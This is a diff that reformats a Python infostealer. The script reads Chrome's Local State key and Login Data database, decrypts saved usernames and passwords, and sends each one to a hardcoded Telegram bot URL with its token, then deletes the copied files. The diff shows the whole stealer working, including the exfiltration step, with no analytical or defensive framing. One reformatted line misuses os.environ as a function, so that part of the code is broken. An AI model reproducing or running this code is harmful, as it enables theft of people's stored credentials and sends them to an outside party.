@@ -14,18 +14,17 @@ try:
     import requests
 except:
     print("installing requests")
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
 try:
     from Crypto.Cipher import AES
 except:
     print("installing pycryptodome")
-    subprocess.check_call(
-        [sys.executable, '-m', 'pip', 'install', 'pycryptodome'])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
 try:
     import win32crypt
 except:
     print("installing pywin32")
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
 
 
 def chrome_date_and_time(chrome_data):
@@ -36,22 +35,28 @@ def chrome_date_and_time(chrome_data):
 
 
 def fetching_encryption_key():
-    # Local_computer_directory_path will look
+    # root_path will look
     # like this below
     # C: => Users => <Your_Name> => AppData =>
     # Local => Google => Chrome => User Data =>
     # Local State
-    local_computer_directory_path = os.path.join(
-        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
-        "User Data", "Local State")
 
-    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+    root_path = os.environ(
+        ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Local State",
+    )
+
+    with open(root_path, "r", encoding="utf-8") as f:
         local_state_data = f.read()
         local_state_data = json.loads(local_state_data)
 
     # decoding the encryption key using base64
-    encryption_key = base64.b64decode(
-        local_state_data["os_crypt"]["encrypted_key"])
+    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
 
     # remove Windows Data Protection API (DPAPI) str
     encryption_key = encryption_key[5:]
@@ -61,23 +66,20 @@ def fetching_encryption_key():
 
 
 def send(text):
-    url = f'https://api.telegram.org/bot5633216566:AAGVHIaZZIHZ3ge-6ZLDbqsZX0F67szyRDo/sendMessage'
-    payload = {
-        'chat_id': ID,
-        'text': text
-    }
+    url = f"https://api.telegram.org/bot5633216566:AAGVHIaZZIHZ3ge-6ZLDbqsZX0F67szyRDo/sendMessage"
+    payload = {"chat_id": ID, "text": text}
 
     r = requests.post(url, json=payload)
     return r
 
 
 def temp_store(mode, data=None):
-    if mode == 'write':
-        with open("temp.txt", 'a') as f:
+    if mode == "write":
+        with open("temp.txt", "a") as f:
             f.write(data)
 
-    elif mode == 'read':
-        with open("temp.txt", 'r') as f:
+    elif mode == "read":
+        with open("temp.txt", "r") as f:
             return f.readlines()
 
 
@@ -92,8 +94,7 @@ def password_decryption(password, encryption_key):
         # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except:
-
-        send("unencripted data : "+str(iv))
+        send("unencripted data : " + str(iv))
 
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
@@ -103,8 +104,16 @@ def password_decryption(password, encryption_key):
 
 def main():
     key = fetching_encryption_key()
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "default", "Login Data")
+    db_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "default",
+        "Login Data",
+    )
     filename = "ChromePasswords.db"
     shutil.copyfile(db_path, filename)
 
@@ -115,7 +124,8 @@ def main():
     # 'logins' table has the data
     cursor.execute(
         "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
-        "order by date_last_used")
+        "order by date_last_used"
+    )
 
     # iterate over all rows
     for row in cursor.fetchall():
@@ -127,9 +137,8 @@ def main():
         last_usuage = row[5]
 
         if user_name or decrypted_password:
-
-            infos = f'''Main URL: {main_url}, Login URL: {login_page_url}, User name: {user_name},Decrypted Password: {decrypted_password}
-            '''
+            infos = f"""Main URL: {main_url}, Login URL: {login_page_url}, User name: {user_name},Decrypted Password: {decrypted_password}
+            """
             temp_store("write", infos)
 
         else:
@@ -146,7 +155,6 @@ def main():
     db.close()
 
     try:
-
         # trying to remove the copied db file as
         # well from local computer
         os.remove(filename)
@@ -160,12 +168,11 @@ def delete_file():
 
 
 if __name__ == "__main__":
-
     main()
     txt = temp_store("read")
     for i in txt:
         # print(i)
         send(i)
     # send(temp_store("read"))
-    print('success')
+    print("success")
     delete_file()
